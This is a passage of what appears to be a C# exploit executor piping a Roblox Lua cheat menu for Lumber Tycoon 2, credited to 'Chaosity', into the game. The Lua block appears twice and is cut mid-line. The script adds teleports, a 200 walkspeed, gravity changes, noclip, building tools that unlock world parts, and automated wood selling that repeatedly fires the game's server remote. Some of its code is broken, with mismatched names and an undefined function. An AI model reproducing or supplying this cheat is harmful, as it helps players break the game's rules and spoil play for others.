'BRejoinServer'\nBRejoinServer.Parent = Main\nBRejoinServer.BackgroundColor3 = Color3.new(0.776471, 0, 0)\nBRejoinServer.Position = UDim2.new(0.540000021, 0, 0.733333349, 0)\nBRejoinServer.Size = UDim2.new(0, 207, 0, 30)\nBRejoinServer.Font = Enum.Font.Cartoon\nBRejoinServer.Text = 'Rejoin Server'\nBRejoinServer.TextColor3 = Color3.new(0, 0, 0)\nBRejoinServer.TextScaled = true\nBRejoinServer.TextSize = 14\nBRejoinServer.TextWrapped = true\nBRejoinServer.MouseButton1Down:connect(function()\nlocal placeId = 13822889\n\ngame:GetService('TeleportService'):Teleport(placeId)\nend)\nDISCO.Name = 'DISCO'\nDISCO.Parent = Main\nDISCO.BackgroundColor3 = Color3.new(1, 1, 1)\nDISCO.BackgroundTransparency = 1\nDISCO.Position = UDim2.new(0.540000021, 0, 0.850000024, 0)\nDISCO.Size = UDim2.new(0, 202, 0, 42)\nDISCO.Font = Enum.Font.SourceSans\nDISCO.Text = 'Made By Chaosity    Discord:  https://discord.gg/DEVYCQp'\nDISCO.TextColor3 = Color3.new(1, 1, 1)\nDISCO.TextScaled = true\nDISCO.TextSize = 14\nDISCO.TextWrapped = true\n\nWalkspeed.Name = 'Walkspeed'\nWalkspeed.Parent = Main\nWalkspeed.BackgroundColor3 = Color3.new(0.776471, 0, 0)\nWalkspeed.Position = UDim2.new(0.776944458, 0, 0.160000011, 0)\nWalkspeed.Size = UDim2.new(0, 100, 0, 30)\nWalkspeed.Font = Enum.Font.Cartoon\nWalkspeed.Text = 'Walkspeed[X]'\nWalkspeed.TextColor3 = Color3.new(0, 0, 0)\nWalkspeed.TextScaled = true\nWalkspeed.TextSize = 14\nWalkspeed.TextWrapped = true\nWalkspeed.MouseButton1Down:connect(function()\n\tlocal walkspeedplayer = game:GetService('Players').LocalPlayer\n\tlocal walkspeedmouse = walkspeedplayer:GetMouse()\n\t\n\tlocal walkspeedenabled = false\n\t\n\tfunction x_walkspeed(key)\n\t\tif (key == 'x') then\n\t\t\tif walkspeedenabled == false then\n\t\t\t\t_G.WS = 200;\n\t\t\t\tlocal Humanoid = game:GetService('Players').LocalPlayer.Character.Humanoid;\n\t\t\t\tHumanoid:GetPropertyChangedSignal('WalkSpeed'):Connect(function()\n\t\t\t\tHumanoid.WalkSpeed = _G.WS;\n\t\t\t\tend)\n\t\t\t\tHumanoid.WalkSpeed = _G.WS;\n\t\t\t\t\n\t\t\t\twalkspeedenabled = true\n\t\t\telseif walkspeedenabled == true then\n\t\t\t\t_G.WS = 20;\n\t\t\t\tlocal Humanoid = game:GetService('Players').LocalPlayer.Character.Humanoid;\n\t\t\t\tHumanoid:GetPropertyChangedSignal('WalkSpeed'):Connect(function()\n\t\t\t\tHumanoid.WalkSpeed = _G.WS;\n\t\t\t\tend)\n\t\t\t\tHumanoid.WalkSpeed = _G.WS;\n\t\t\t\t\n\t\t\t\twalkspeedenabled = false\n\t\t\tend\n\t\tend\n\tend\n\t\n\twalkspeedmouse.KeyDown:connect(x_walkspeed)\n\t\nend)\nGravity.Name = 'Gravity'\nGravity.Parent = Main\nGravity.BackgroundColor3 = Color3.new(0.776471, 0, 0)\nGravity.Position = UDim2.new(0.776944458, 0, 0.303333342, 0)\nGravity.Size = UDim2.new(0, 100, 0, 30)\nGravity.Font = Enum.Font.Cartoon\nGravity.Text = 'Gravity'\nGravity.TextColor3 = Color3.new(0, 0, 0)\nGravity.TextScaled = true\nGravity.TextSize = 14\nGravity.TextWrapped = true\nGravity.MouseButton1Down:connect(function()\nif Gravity == true then\nGravity = false\ngame.workspace.Gravity = 196.2\nelse\nGravity = true\ngame.workspace.Gravity = 45\nend\nend)\nBtools.Name = 'Btools'\nBtools.Parent = Main\nBtools.BackgroundColor3 = Color3.new(0.776471, 0, 0)\nBtools.Position = UDim2.new(0.776944458, 0, 0.443333328, 0)\nBtools.Size = UDim2.new(0, 100, 0, 30)\nBtools.Font = Enum.Font.Cartoon\nBtools.Text = 'Btools'\nBtools.TextColor3 = Color3.new(0, 0, 0)\nBtools.TextScaled = true\nBtools.TextSize = 14\nBtools.TextWrapped = true\nBTools.MouseButton1Down:connect(function()\n\tgame.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, true)\nfor index, child in pairs(game:GetService('Workspace'):GetChildren()) do\n   if child.ClassName == 'Part' then\n       child.Locked = false\n   end\n   if child.ClassName == 'MeshPart' then\n       child.Locked = false\n   end\n   if child.ClassName == 'UnionOperation' then\n       child.Locked = false\n   end\n   if child.ClassName == 'Model' then\n       for index, chil in pairs(child:GetChildren()) do\n           if chil.ClassName == 'Part' then\n               chil.Locked = false\n           end\n           if chil.ClassName == 'MeshPart' then\n               chil.Locked = false\n           end\n           if chil.ClassName == 'UnionOperation' then\n               chil.Locked = false\n           end\n           if chil.ClassName == 'Model' then\n               for index, childe in pairs(chil:GetChildren()) do\n                   if childe.ClassName == 'Part' then\n                       childe.Locked = false\n                   end\n                   if childe.ClassName == 'MeshPart' then\n                       childe.Locked = false\n                   end\n                   if childe.ClassName == 'UnionOperation' then\n                       childe.Locked = false\n                   end\n                   if childe.ClassName == 'Model' then\n                       for index, childeo in pairs(childe:GetChildren()) do\n                           if childeo.ClassName == 'Part' then\n                               childeo.Locked = false\n                           end\n                           if childeo.ClassName == 'MeshPart' then\n                               childeo.Locked = false\n                           end\n                           if childeo.ClassName == 'UnionOperation' then\n                               childeo.Locked = false\n                           end\n                           if childeo.ClassName == 'Model' then\n                           end\n                       end\n                   end\n               end\n           end\n       end\n   end\nend\nc = Instance.new('HopperBin', game:GetService('Players').LocalPlayer.Backpack)\nc.BinType = Enum.BinType.Hammer\nc = Instance.new('HopperBin', game:GetService('Players').LocalPlayer.Backpack)\nc.BinType = Enum.BinType.Clone\nc = Instance.new('HopperBin', game:GetService('Players').LocalPlayer.Backpack)\nc.BinType = Enum.BinType.Grab\nend)\nNoclip.Name = 'Noclip'\nNoclip.Parent = Main\nNoclip.BackgroundColor3 = Color3.new(0.776471, 0, 0)\nNoclip.Position = UDim2.new(0.776944458, 0, 0.586666644, 0)\nNoclip.Size = UDim2.new(0, 100, 0, 30)\nNoclip.Font = Enum.Font.Cartoon\nNoclip.Text = 'Noclip [B]'\nNoclip.TextColor3 = Color3.new(0, 0, 0)\nNoclip.TextScaled = true\nNoclip.TextSize = 14\nNoclip.TextWrapped = true\nNoclip.MouseButton1Down:connect(function()\n\t\n\tlocal noclipplayer = game:GetService('Players').LocalPlayer\n\tlocal noclipmouse = noclipplayer:GetMouse()\n\t\n\tlocal donoclip = false\n\tlocal noclip = false\n\t\n\tfunction b_noclip(key)\n\t\tif (key == 'b') then\n\t\t\tif noclip == false then\n\t\t\t\tdonoclip = true\n\t\t\t\t\n\t\t\t\tnoclip = true\n\t\t\telseif noclip == true then\n\t\t\t\tdonoclip = false\n\t\t\t\t\n\t\t\t\tnoclip = false\n\t\t\tend\n\t\tend\n\tend\n\t\n\tnoclipmouse.KeyDown:connect(b_noclip)\n\t\n\tgame:GetService('Players').LocalPlayer.Character.Head.Touched:connect(function(obj)\n\t\tif obj ~= workspace.Terrain then\n\t\t\tif donoclip == true then\n\t\t\t\tobj.CanCollide = false\n\t\t\telse\n\t\t\t\tobj.CanCollide = true\n\t\t\tend\n\t\tend\n\tend)\nend)\nOpen.Name = 'Open'\nOpen.Parent = LT2GUI1\nOpen.BackgroundColor3 = Color3.new(0.819608, 0, 0)\nOpen.Position = UDim2.new(0, 0, 0.699999988, 0)\nOpen.Size = UDim2.new(0, 100, 0, 50)\nOpen.Visible = false\nOpen.Font = Enum.Font.SourceSans\nOpen.Text = 'Open'\nOpen.TextColor3 = Color3.new(0.988235, 0.988235, 0.988235)\nOpen.TextScaled = true\nOpen.TextSize = 14\nOpen.TextWrapped = true\nOpen.MouseButton1Down:connect(function()\n    Open.Visible = false\n    Main.Visible = true\nend)\nend)\n");
      NamedPipes.LuaPipe("-- MADE BY Chaosity Chaosity\nspawn(function()\n\nlocal LT2GUI1 = Instance.new('ScreenGui')\nlocal Main = Instance.new('Frame')\nlocal TOPBAR = Instance.new('Frame')\nlocal Name = Instance.new('TextLabel')\nlocal EXIT = Instance.new('TextButton')\nlocal Cave = Instance.new('TextButton')\nlocal PalmIsland = Instance.new('TextButton')\nlocal Swamp = Instance.new('TextButton')\nlocal Volcano = Instance.new('TextButton')\nlocal LinkLogic = Instance.new('TextButton')\nlocal LandStore = Instance.new('TextButton')\nlocal BobShack = Instance.new('TextButton')\nlocal WoodRUs = Instance.new('TextButton')\nlocal Dock = Instance.new('TextButton')\nlocal BoxedCars = Instance.new('TextButton')\nlocal TPPLOT = Instance.new('TextButton')\nlocal BringWood = Instance.new('TextButton')\nlocal BSellChoppedWood = Instance.new('TextButton')\nlocal BTPCutLogs = Instance.new('TextButton')\nlocal BPhantomWood = Instance.new('TextButton')\nlocal TPNAME = Instance.new('TextLabel')\nlocal FUNCNAME = Instance.new('TextLabel')\nlocal BRejoinServer = Instance.new('TextButton')\nlocal DISCO = Instance.new('TextLabel')\nlocal Walkspeed = Instance.new('TextButton')\nlocal Gravity = Instance.new('TextButton')\nlocal Btools = Instance.new('TextButton')\nlocal Noclip = Instance.new('TextButton')\nlocal Open = Instance.new('TextButton')\n--Properties:\nLT2GUI1.Name = 'LT2GUI  1'\nLT2GUI1.Parent = game.Players.LocalPlayer:WaitForChild('PlayerGui')\n\nMain.Name = 'Main'\nMain.Parent = LT2GUI1\nMain.BackgroundColor3 = Color3.new(0.364706, 0.364706, 0.364706)\nMain.Position = UDim2.new(0.300000012, 0, 0.30399999, 0)\nMain.Size = UDim2.new(0, 450, 0, 300)\nMain.Active = true\nMain.Draggable = true\n\nTOPBAR.Name = 'TOPBAR'\nTOPBAR.Parent = Main\nTOPBAR.BackgroundColor3 = Color3.new(0.815686, 0, 0)\nTOPBAR.Position = UDim2.new(0, 0, -0.129999995, 0)\nTOPBAR.Size = UDim2.new(0, 450, 0, 39)\n\nName.Name = 'Name'\nName.Parent = TOPBAR\nName.BackgroundColor3 = Color3.new(1, 1, 1)\nName.BackgroundTransparency = 1\nName.Size = UDim2.new(0, 382, 0, 39)\nName.Font = Enum.Font.ArialBold\nName.Text = 'Lumber Tycoon 2  V1'\nName.TextColor3 = Color3.new(1, 1, 1)\nName.TextScaled = true\nName.TextSize = 14\nName.TextWrapped = true\n\nEXIT.Name = 'EXIT'\nEXIT.Parent = TOPBAR\nEXIT.BackgroundColor3 = Color3.new(1, 1, 1)\nEXIT.BackgroundTransparency = 1\nEXIT.Position = UDim2.new(0.892499983, 0, 0, 0)\nEXIT.Size = UDim2.new(0, 43, 0, 39)\nEXIT.Font = Enum.Font.SourceSans\nEXIT.Text = 'X'\nEXIT.TextColor3 = Color3.new(0, 0, 0)\nEXIT.TextScaled = true\nEXIT.TextSize = 14\nEXIT.TextWrapped = true\nEXIT.MouseButton1Down:connect(function()\n    Open.Visible = true\n    Main.Visible = false\nend)\nCave.Name = 'Cave'\nCave.Parent = Main\nCave.BackgroundColor3 = Color3.new(0.776471, 0, 0)\nCave.Position = UDim2.new(0.0199999996, 0, 0.306666672, 0)\nCave.Size = UDim2.new(0, 100, 0, 30)\nCave.Font = Enum.Font.Cartoon\nCave.Text = 'Cave'\nCave.TextColor3 = Color3.new(0, 0, 0)\nCave.TextScaled = true\nCave.TextSize = 14\nCave.TextWrapped = true\nCave.MouseButton1Down:connect(function()\n\tgame:GetService('Players').LocalPlayer.Character:MoveTo(Vector3.new(3581, -179, 430))\nend)\nPalmIsland.Name = 'PalmIsland'\nPalmIsland.Parent = Main\nPalmIsland.BackgroundColor3 = Color3.new(0.776471, 0, 0)\nPalmIsland.Position = UDim2.new(0.0199999996, 0, 0.163333341, 0)\nPalmIsland.Size = UDim2.new(0, 100, 0, 30)\nPalmIsland.Font = Enum.Font.Cartoon\nPalmIsland.Text = 'Palm Island'\nPalmIsland.TextColor3 = Color3.new(0, 0, 0)\nPalmIsland.TextScaled = true\nPalmIsland.TextSize = 14\nPalmIsland.TextWrapped = true\nPalmIsland.MouseButton1Down:connect(function()\n\tgame:GetService('Players').LocalPlayer.Character:MoveTo(Vector3.new(2549, -5, -42))\nend)\nSwamp.Name = 'Swamp'\nSwamp.Parent = Main\nSwamp.BackgroundColor3 = Color3.new(0.776471, 0, 0)\nSwamp.Position = UDim2.new(0.0199999996, 0, 0.589999974, 0)\nSwamp.Size = UDim2.new(0, 100, 0, 30)\nSwamp.Font = Enum.Font.Cartoon\nSwamp.Text = 'Swamp'\nSwamp.TextColor3 = Color3.new(0, 0, 0)\nSwamp.TextScaled = true\nSwamp.TextSize = 14\nSwamp.TextWrapped = true\nSwamp.MouseButton1Down:connect(function()\n\tgame:GetService('Players').LocalPlayer.Character:MoveTo(Vector3.new(-1209, 132, -801))\nend)\nVolcano.Name = 'Volcano'\nVolcano.Parent = Main\nVolcano.BackgroundColor3 = Color3.new(0.776471, 0, 0)\nVolcano.Position = UDim2.new(0.0199999996, 0, 0.446666658, 0)\nVolcano.Size = UDim2.new(0, 100, 0, 30)\nVolcano.Font = Enum.Font.Cartoon\nVolcano.Text = 'Volcano'\nVolcano.TextColor3 = Color3.new(0, 0, 0)\nVolcano.TextScaled = true\nVolcano.TextSize = 14\nVolcano.TextWrapped = true\nVolcano.MouseButton1Down:connect(function()\n\tgame:GetService('Players').LocalPlayer.Character:MoveTo(Vector3.new(-1585, 622, 1140))\nend)\nLinkLogic.Name = 'LinkLogic'\nLinkLogic.Parent = Main\nLinkLogic.BackgroundColor3 = Color3.new(0.776471, 0, 0)\nLinkLogic.Position = UDim2.new(0.264444441, 0, 0.303333342, 0)\nLinkLogic.Size = UDim2.new(0, 100, 0, 30)\nLinkLogic.Font = Enum.Font.Cartoon\nLinkLogic.Text = 'Link's Logic'\nLinkLogic.TextColor3 = Color3.new(0, 0, 0)\nLinkLogic.TextScaled = true\nLinkLogic.TextSize = 14\nLinkLogic.TextWrapped = true\nLinkLogic.TextWrapped = true\nLinkLogic.MouseButton1Down:connect(function()\n\tgame:GetService('Players').LocalPlayer.Character:MoveTo(Vector3.new(4605, 3, -727))\nend)\nLandStore.Name = 'LandStore'\nLandStore.Parent = Main\nLandStore.BackgroundColor3 = Color3.new(0.776471, 0, 0)\nLandStore.Position = UDim2.new(0.264444441, 0, 0.586666644, 0)\nLandStore.Size = UDim2.new(0, 100, 0, 30)\nLandStore.Font = Enum.Font.Cartoon\nLandStore.Text = 'Land Store'\nLandStore.TextColor3 = Color3.new(0, 0, 0)\nLandStore.TextScaled = true\nLandStore.TextSize = 14\nLandStore.TextWrapped = true\nLandStore.MouseButton1Down:connect(function()\n\tgame:GetService('Players').LocalPlayer.Character:MoveTo(Vector3.new(258, 3, -99))\nend)\nBobShack.Name = 'BobShack'\nBobShack.Parent = Main\nBobShack.BackgroundColor3 = Color3.new(0.776471, 0, 0)\nBobShack.Position = UDim2.new(0.264444441, 0, 0.160000011, 0)\nBobShack.Size = UDim2.new(0, 100, 0, 30)\nBobShack.Font = Enum.Font.Cartoon\nBobShack.Text = 'Bob's Shack'\nBobShack.TextColor3 = Color3.new(0, 0, 0)\nBobShack.TextScaled = true\nBobShack.TextSize = 14\nBobShack.TextWrapped = true\nBobShack.MouseButton1Down:connect(function()\n\tgame:GetService('Players').LocalPlayer.Character:MoveTo(Vector3.new(260, 8, -2542))\nend)\nWoodRUs.Name = 'WoodRUs'\nWoodRUs.Parent = Main\nWoodRUs.BackgroundColor3 = Color3.new(0.776471, 0, 0)\nWoodRUs.Position = UDim2.new(0.264444441, 0, 0.443333328, 0)\nWoodRUs.Size = UDim2.new(0, 100, 0, 30)\nWoodRUs.Font = Enum.Font.Cartoon\nWoodRUs.Text = 'Wood R Us'\nWoodRUs.TextColor3 = Color3.new(0, 0, 0)\nWoodRUs.TextScaled = true\nWoodRUs.TextSize = 14\nWoodRUs.TextWrapped = true\nWoodRUs.MouseButton1Down:connect(function()\n\tgame:GetService('Players').LocalPlayer.Character:MoveTo(Vector3.new(265, 3, 57))\nend)\nDock.Name = 'Dock'\nDock.Parent = Main\nDock.BackgroundColor3 = Color3.new(0.776471, 0, 0)\nDock.Position = UDim2.new(0.0199999996, 0, 0.73333329, 0)\nDock.Size = UDim2.new(0, 100, 0, 30)\nDock.Font = Enum.Font.Cartoon\nDock.Text = 'Dock'\nDock.TextColor3 = Color3.new(0, 0, 0)\nDock.TextScaled = true\nDock.TextSize = 14\nDock.TextWrapped = true\nDock.MouseButton1Down:connect(function()\n\tgame:GetService('Players').LocalPlayer.Character:MoveTo(Vector3.new(1114, -1, -197))\nend)\nBoxedCars.Name = 'BoxedCars'\nBoxedCars.Parent = Main\nBoxedCars.BackgroundColor3 = Color3.new(0.776471, 0, 0)\nBoxedCars.Position = UDim2.new(0.264444441, 0, 0.729999959, 0)\nBoxedCars.Size = UDim2.new(0, 100, 0, 30)\nBoxedCars.Font = Enum.Font.Cartoon\nBoxedCars.Text = 'Boxed Cars'\nBoxedCars.TextColor3 = Color3.new(0, 0, 0)\nBoxedCars.TextScaled = true\nBoxedCars.TextSize = 14\nBoxedCars.TextWrapped = true\nBoxedCars.MouseButton1Down:connect(function()\n\tgame:GetService('Players').LocalPlayer.Character:MoveTo(Vector3.new(509, 3, -1463))\nend)\nTPPLOT.Name = 'TPPLOT'\nTPPLOT.Parent = Main\nTPPLOT.BackgroundColor3 = Color3.new(0.776471, 0, 0)\nTPPLOT.Position = UDim2.new(0.0199999996, 0, 0.870000005, 0)\nTPPLOT.Size = UDim2.new(0, 210, 0, 30)\nTPPLOT.Font = Enum.Font.Cartoon\nTPPLOT.Text = 'Teleport To Your Plot'\nTPPLOT.TextColor3 = Color3.new(0, 0, 0)\nTPPLOT.TextScaled = true\nTPPLOT.TextSize = 14\nTPPLOT.TextWrapped = true\nTPPLOT.MouseButton1Down:connect(function()\n\tfor i, v in pairs(game.Workspace.Properties:GetChildren()) do\n\t\tif v.Owner.Value == game.Players.LocalPlayer then\n\t\t\tgame.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.OriginSquare.CFrame\n\t\tend\n\tend\nend)\nBringWood.Name = 'BringWood'\nBringWood.Parent = Main\nBringWood.BackgroundColor3 = Color3.new(0.776471, 0, 0)\nBringWood.Position = UDim2.new(0.539166689, 0, 0.589999974, 0)\nBringWood.Size = UDim2.new(0, 100, 0, 30)\nBringWood.Font = Enum.Font.Cartoon\nBringWood.Text = 'Bring Wood'\nBringWood.TextColor3 = Color3.new(0, 0, 0)\nBringWood.TextScaled = true\nBringWood.TextSize = 14\nBringWood.TextWrapped = true\nBringWood.MouseButton1Down:connect(function()\n\tfor _, Log in pairs(game.Workspace.LogModels:GetChildren()) do\n\t\tif Log.Name:sub(1, 6) == 'Loose_' and Log:findFirstChild('Owner') and Log.Owner.Value == game.Players.LocalPlayer then\n\t\t\tLog:MoveTo(game.Players.LocalPlayer.Character.Torso.Position + Vector3.new(0, 10, 0))\n\t\tend\n\tend\nend)\nBSellChoppedWood.Name = 'BSellChoppedWood'\nBSellChoppedWood.Parent = Main\nBSellChoppedWood.BackgroundColor3 = Color3.new(0.776471, 0, 0)\nBSellChoppedWood.Position = UDim2.new(0.539166689, 0, 0.160000011, 0)\nBSellChoppedWood.Size = UDim2.new(0, 100, 0, 30)\nBSellChoppedWood.Font = Enum.Font.Cartoon\nBSellChoppedWood.Text = 'Sell Chopped Wood'\nBSellChoppedWood.TextColor3 = Color3.new(0, 0, 0)\nBSellChoppedWood.TextScaled = true\nBSellChoppedWood.TextSize = 14\nBSellChoppedWood.TextWrapped = true\nBSellChoppedWood.MouseButton1Click:connect(function()\n\t\tfor _, Log in pairs(workspace.LogModels:GetChildren()) do\n\t\tif Log.Name:sub(1, 6) == 'Loose_' and Log:findFirstChild('Owner') then\n\t\t\tif Log.Owner.Value == game.Players.LocalPlayer then\n\t\t\t\tfor i,v in pairs(Log:GetChildren()) do\n\t\t\t\t\tif v.Name=='WoodSection' then\n\t\t\t\t\t\tspawn(function()\n\t\t\t\t\t\t\tfor i=1,10 do\n\t\t\t\t\t\t\t\twait()\n\t\t\t\t\t\t\t\tv.CFrame=CFrame.new(Vector3.new(315, -0.296, 85.791))*CFrame.Angles(math.rad(90),0,0)\n\t\t\t\t\t\t\tend\n\t\t\t\t\t\tend)\n\t\t\t\t\tend\n\t\t\t\tend\n\t\t\t\tspawn(function()\n\t\t\t\t\tfor i=1,20 do\n\t\t\t\t\t\twait()\n\t\t\t\t\t\tgame.ReplicatedStorage.Interaction.ClientIsDragging:FireServer(Log)\n\t\t\t\t\tend\n\t\t\t\tend)\n\t\t\tend\n\t\tend\n\tend\nend)\nBTPCutLogs.Name = 'BTPCutLogs'\nBTPCutLogs.Parent = Main\nBTPCutLogs.BackgroundColor3 = Color3.new(0.776471, 0, 0)\nBTPCutLogs.Position = UDim2.new(0.539166689, 0, 0.306666672, 0)\nBTPCutLogs.Size = UDim2.new(0, 100, 0, 30)\nBTPCutLogs.Font = Enum.Font.Cartoon\nBTPCutLogs.Text = 'Teleport Cut Logs To You'\nBTPCutLogs.TextColor3 = Color3.new(0, 0, 0)\nBTPCutLogs.TextScaled = true\nBTPCutLogs.TextSize = 14\nBTPCutLogs.TextWrapped = true\nBTPCutLogs.MouseButton1Click:connect(function()\n\tfor _, Log in pairs(game.Workspace.LogModels:GetChildren()) do\nif Log.Name:sub(1, 6) == 'Loose_' and Log:findFirstChild('Owner') then\nif Log.Owner.Value == game.Players.LocalPlayer then\nLog:MoveTo(game.Players.LocalPlayer.Character.Torso.Position + Vector3.new(0, 15, 0))\nend\nend\nend\nend)\nBPhantomWood.Name = 'BPhantomWood'\nBPhantomWood.Parent = Main\nBPhantomWood.BackgroundColor3 = Color3.new(0.776471, 0, 0)\nBPhantomWood.Position = UDim2.new(0.539166689, 0, 0.446666658, 0)\nBPhantomWood.Size = UDim2.new(0, 100, 0, 30)\nBPhantomWood.Font = Enum.Font.Cartoon\nBPhantomWood.Text = 'Teleport Cavecrawler Wood'\nBPhantomWood.TextColor3 = Color3.new(0, 0, 0)\nBPhantomWood.TextScaled = true\nBPhantomWood.TextSize = 14\nBPhantomWood.TextWrapped = true\nBPhantomWood.MouseButton1Down:connect(function()\nfor i, v in pairs(game.Workspace:GetChildren()) do\nif v.Name == 'TreeRegion' then\nfor a, b in pairs(v:GetChildren()) do\ntree(b, 'CaveCrawler')\nend\nend\nend\nend)\nTPNAME.Name = 'TPNAME'\nTPNAME.Parent = Main\nTPNAME.BackgroundColor3 = Color3.new(1, 1, 1)\nTPNAME.BackgroundTransparency = 1\nTPNAME.Position = UDim2.new(0.0199999996, 0, 0, 0)\nTPNAME.Size = UDim2.new(0, 220, 0, 42)\nTPNAME.Font = Enum.Font.SourceSans\nTPNAME.Text = 'Teleports'\nTPNAME.TextColor3 = Color3.new(1, 1, 1)\nTPNAME.TextScaled = true\nTPNAME.TextSize = 14\nTPNAME.TextWrapped = true\n\nFUNCNAME.Name = 'FUNCNAME'\nFUNCNAME.Parent = Main\nFUNCNAME.BackgroundColor3 = Color3.new(1, 1, 1)\nFUNCNAME.BackgroundTransparency = 1\nFUNCNAME.Position = UDim2.new(0.540000021, 0, 0, 0)\nFUNCNAME.Size = UDim2.new(0, 202, 0, 42)\nFUNCNAME.Font = Enum.Font.SourceSans\nFUNCNAME.Text = 'Functions'\nFUNCNAME.TextColor3 = Color3.new(1, 1, 1)\nFUNCNAME.TextScaled = true\nFUNCNAME.TextSize = 14\nFUNCNAME.TextWrapped = true\n\nBRejoinServer.Name = 'BRejoinServer'\nBRejoinServer.Parent = Main\nBRejoinServer.BackgroundColor3 = Color3.new(0.776471, 0, 0)\nBRejoinServer.Position = UDim2.new(0.540000021, 0, 0.733333349, 0)\nBRejoinServer.Size = UDim2.new(0, 207, 0, 30)\nBRejoinServer.Font = Enum.Font.Cartoon\nBRejoinServer.Text = 'Rejoin Server'\nBRejoinServer.TextColor3 = Color3.new(0, 0, 0)\nBRejoinServer.TextScaled = true\nBRejoinServer.TextSize = 14\nBRejoinServer.TextWrapped = true\nBRejoinServer.MouseButton1Down:connect(function()\nlocal placeId = 13822889\n\ngame:GetService('TeleportService'):Teleport(placeId)\nend)\nDISCO.Name = 'DISCO'\nDISCO.Parent = Main\nDISCO.BackgroundColor3 = Color3.new(1, 1, 1)\nDISCO.BackgroundTransparency = 1\nDISCO.Position = UDim2.new(0.540000021, 0, 0.850000024, 0)\nDISCO.Size = UDim2.new(0, 202, 0, 42)\nDISCO.Font = Enum.Font.SourceSans\nDISCO.Text = 'Made By Chaosity    Discord:  https://discord.gg/DEVYCQp'\nDISCO.TextColor3 = Color3.new(1, 1, 1)\nDISCO.TextScaled = true\nDISCO.TextSize = 14\nDISCO.TextWrapped = true\n\nWalkspeed.Name = 'Walkspeed'\nWalkspeed.Parent = Main\nWalkspeed.BackgroundColor3 = Color3.new(0.776471, 0, 0)\nWalkspeed.Position = UDim2.new(0.776944458, 0, 0.160000011, 0)\nWalkspeed.Size = UDim2.new(0, 100, 0, 30)\nWalkspeed.Font = Enum.Font.Cartoon\nWalkspeed.Text = 'Walkspeed[X]'\nWalkspeed.TextColor3 = Color3.new(0, 0, 0)\nWalkspeed.TextScaled = true\nWalkspeed.TextSize = 14\nWalkspeed.TextWrapped = true\nWalkspeed.MouseButton1Down:connect(function()\n\tlocal walkspeedplayer = game:GetService('Players').LocalPlayer\n\tlocal walkspeedmouse = walkspeedplayer:GetMouse()\n\t\n\tlocal walkspeedenabled = false\n\t\n\tfunction x_walkspeed(key)\n\t\tif (key == 'x') then\n\t\t\tif walkspeedenabled == false then\n\t\t\t\t_G.WS = 200;\n\t\t\t\tlocal Humanoid = game:GetService('Players').LocalPlayer.Character.Humanoid;\n\t\t\t\tHumanoid:GetPropertyChangedSignal('WalkSpeed'):Connect(function()\n\t\t\t\tHumanoid.WalkSpeed = _G.WS;\n\t\t\t\tend)\n\t\t\t\tHumanoid.WalkSpeed = _G.WS;\n\t\t\t\t\n\t\t\t\twalkspeedenabled = true\n\t\t\telseif walkspeedenabled == true then\n\t\t\t\t_G.WS = 20;\n\t\t\t\tlocal Humanoid = game:GetService('Players').LocalPlayer.Character.Humanoid;\n\t\t\t\tHumanoid:GetPropertyChangedSignal('WalkSpeed'):Connect(function()\n\t\t\t\tHumanoid.WalkSpeed = _G.WS;\n\t\t\t\tend)\n\t\t\t\tHumanoid.WalkSpeed = _G.WS;\n\t\t\t\t\n\t\t\t\twalkspeedenabled = false\n\t\t\tend\n\t\tend\n\tend\n\t\n\twalkspeedmouse.KeyDown:connect(x_walkspeed)\n\t\nend)\nGravity.Name = 'Gravity'\nGravity.Parent = Main\nGravity.BackgroundColor3 = Color3.new(0.776471, 0, 0)\nGravity.Position = UDim2.new(0.776944458, 0, 0.303333342, 0)\nGravity.Size = UDim2.new(0, 100, 0, 30)\nGravity.Font = Enum.Font.Cartoon\nGravity.Text = 'Gravity'\nGravity.TextColor3 = Color3.new(0, 0, 0)\nGravity.TextScaled = true\nGravity.TextSize = 14\nGravity.TextWrapped = true\nGravity.MouseButton1Down:connect(function()\nif Gravity == true then\nGravity = false\ngame.workspace.Gravity = 196.2\nelse\nGravity = true\ngame.workspace.Gravity = 45\nend\nend)\nBtools.Name = 'Btools'\nBtools.Parent = Main\nBtools.BackgroundColor3 = Color3.new(0.776471, 0, 0)\nBtools.Position = UDim2.new(0.776944458, 0, 0.443333328, 0)\nBtools.Size = UDim2.new(0, 100, 0, 30)\nBtools.Font = Enum.Font.Cartoon\nBtools.Text = 'Btools'\nBtools.TextColor3 = Color3.new(0, 0, 0)\nBtools.TextScaled = true\nBtools.TextSize = 14\nBtools.TextWrapped = true\nBTools.MouseButton1Down:connect(function()\n\tgame.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, true)\nfor index, child in pairs(game:GetService('Workspace'):GetChildren()) do\n   if child.ClassName == 'Part' then\n       child.Locked = false\n   end\n   if child.ClassName == 'MeshPart' then\n       child.Locked = false\n   end\n   if child.ClassName == 'UnionOperation' then\n       child.Locked = false\n   end\n   if child.ClassName == 'Model' then\n       for index, chil in pairs(child:GetChildren()) do\n           if chil.ClassName == 'Part' then\n               chil.Locked = false\n           end\n           if chil.ClassName == 'MeshPart' then\n               chil.Locked = false\n           end\n           if chil.ClassName == 'UnionOperation' then\n               chil.Locked = false\n           end\n           if chil.ClassName == 'Model' then\n               for index, childe in pairs(chil:GetChildren()) do\n                   if childe.ClassName == 'Part' then\n                       childe.Locked = false\n                   end\n                   if childe.ClassName == 'MeshPart' then\n                       childe.Locked = false\n                   end\n                   if childe.ClassName == 'UnionOperation' then\n                       childe.Locked = false\n                   end\n                   if childe.ClassName == 'Model' then\n                       for index, childeo in pairs(childe:GetChildren()) do\n                           if childeo.ClassName == 'Part' then\n                               childeo.Locked = false\n                           end\n                           if childeo.ClassName == 'MeshPart' then\n                               childeo.Locked = false\n                           end\n                           if childeo.ClassName == 'UnionOperation' then\n                               childeo.Locked = false\n                           end\n                           if childeo.ClassName == 'Model' then\n                           end\n                       end\n                   end\n               end\n           end\n       end\n   end\nend\nc = Instance.new('HopperBin', game:GetService('Players').LocalPlayer.Backpack)\nc.BinType = Enum.BinType.Hammer\nc = Instance.new('HopperBin', game:GetService('Players').LocalPlayer.Backpack)\nc.BinType = Enum.BinType.Clone\nc = Instance.new('HopperBin', game:GetService('Players').LocalPlayer.Backpack)\nc.BinType = Enum.BinType.Grab\nend)\nNoclip.Name = 'Noclip'\nNoclip.Parent = Main\nNoclip.BackgroundColor3 = Color3.new(0.776471, 0, 0)\nNoclip.Position = UDim2.new(0.776944458, 0, 0.586666644, 0)\nNoclip.Size = UDim2.new(0, 100, 0, 